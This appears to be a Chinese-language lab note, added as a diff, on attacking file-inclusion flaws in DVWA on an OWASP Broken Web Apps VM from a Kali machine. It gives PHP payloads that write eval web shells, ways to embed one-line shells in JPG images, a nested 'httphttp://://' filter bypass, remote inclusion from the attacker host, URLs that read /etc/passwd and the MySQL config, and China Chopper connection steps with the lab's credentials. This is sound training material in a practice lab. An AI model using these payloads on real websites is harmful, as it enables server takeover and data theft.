@@ -1,0 +1,128 @@
+﻿项目实验环境:
+owasp下载:
+https://sourceforge.net/projects/owaspbwa/files/1.2/OWASP_Broken_Web_Apps_VM_1.2.zip/download
+测试渗透kali下载:
+https://images.offensive-security.com/virtual-images/kali-linux-2018.2-vm-amd64.zip
+
+
+
+
+
+
+
+
+
+
+#################
+#192.168.218.128:owasp
+#192.168.218.129: kali.
+
+
+步骤:
+
+
+本地文件包含:
+
+1.制作一句话图片木马:eg:yange.jpg
+<?fputs(fopen("shell20.php","w"),'<?php eval($_POST[yangge]);?>')?>
+
+2.上传图片木马文件
+3.执行文件包含并生成后门.
+4.通过菜刀连接webshell.
+
+#图片最好小一点,20kb左右.
+#某些图片的格式可能不对,所以包含后访问.无法出现乱码.eg,有个大的改了尺寸不行,邓紫棋图片也不行.
+
+################@###########################
+文件包含漏洞:
+低安全级别:本地,远程都可以
+
+中安全级别:本地可以,远程不行,看源码吧http://替换成""了.,绕过中安全级别,访问
+http://192.168.218.128/dvwa/vulnerabilities/fi/?page=httphttp://://192.168.218.129/yange500.txt
+因为源代码中未检测多次替换.这种直接绕过了,还会在fi目录下生成shell500.php文件,连接菜刀.
+hthttp://tp:// 			http://		= 	http://,	两套http重叠在一起.
+str_replace函数依然轻松绕过.
+
+高安全级别:文件名不等于include.php,不能上传,硬编码模式,朝鲜网络为什么不被攻击?,他们不上网.!!!
+稍微做一些检测,不要使用通配符之类的.加白名单.
+
+
+
+
+文件包含漏洞,直接访问内部文件.eg:
+
+http://192.168.218.128/dvwa/vulnerabilities/fi/?page=/var/www/dvwa/robots.txt
+http://192.168.218.128/dvwa/vulnerabilities/fi/?page=/etc/hosts
+http://192.168.218.128/dvwa/vulnerabilities/fi/?page=/etc/mysql/my.conf
+http://192.168.218.128/dvwa/vulnerabilities/fi/?page=/etc/passwd
+###################
+
+将一句话木马包含在图片中,几种方法:
+1、copy命令
+CMD命令：copy 1.jpg/b+1.php/a 2.jpg
+
+2、PS软件
+PS打开图片，在文件—>文件简介里插入需要的木马代码，最后：文件—>保存【保存：覆盖原文件，也可以另存为其他格式】。
+
+3、edjpg软件
+将图片直接拖到edjpg.exe上，在弹出窗口内输入一句话木马即可。
+
+4、十六进制编辑器编辑添加
+用010 Editor或winhex等十六进制编辑器打开图片，将一句话木马插入到右边最底层或最上层后保存。
+
+5、常见的一句话
+asp一句话 <%eval request("pass")%>
+aspx一句话 <%@ Page Language="Jscript"%><%eval(Request.Item["pass"],"unsafe");%>
+php一句话 <?php @eval($_POST["pass"]);?>
+###################
+
+文件上传漏洞上传图片，文件包含漏洞访问图片，在包含目录下生成shell。php文件，使用菜刀连接。
+文件上传结合文件包含使用,访问图片并不能让图片执行,所以无法执行一句话木马
+(服务器上所有的静态资源都会返回给客户端渲染,服务器不会执行.)
+想让上传的图片木马加载到文件上传去执行,
+
+文件上传路径:/var/www/dvwa/hackable/uploads
+文件包含路径:/var/www/dvwa/vulnerabilities/fi
+
+相对路径行,执行成功 网页文件包含访问会出现乱码.
+并在包含路径下生成一句话木马中的 shell20 文件.,内容是一句话.
+http://192.168.218.128/dvwa/vulnerabilities/fi/?page=../../hackable/uploads/4.jpg
+
+
+############
+远程文件包含:
+root@kali: ~# service apache2 start
+root@kali: ~# vim /vvar/www/html/yange.txt
+php文件不行,用txt或者jpg就可以了.
+
+<?fputs(fopen("shell50.php","w"),'<?php eval($_POST[yangge50]);?>')?>
+
+远程包含:,访问.文件包含漏洞执行了访问的文件,并非服务器执行静态文件???.
+http://192.168.218.128/dvwa/vulnerabilities/fi/?page=http://192.168.218.129/yange.txt
+
+并在文件包含目录下生成shell50文件,
+#################
+
+
+
+##########
+中国菜刀使用方法:
+添加地址:
+http://192.168.218.128/dvwa/vulnerabilities/fi/shell50.php
+密码:yange50
+数据库配置:
+配置:
+<T>MYSQL</T>			#数据库类型
+<H>localhost</H>		#主机名
+<U>root</U>				#User
+<P>owaspbwa</P>			#密码
+
+
+
+
+
+
+
+
+
+
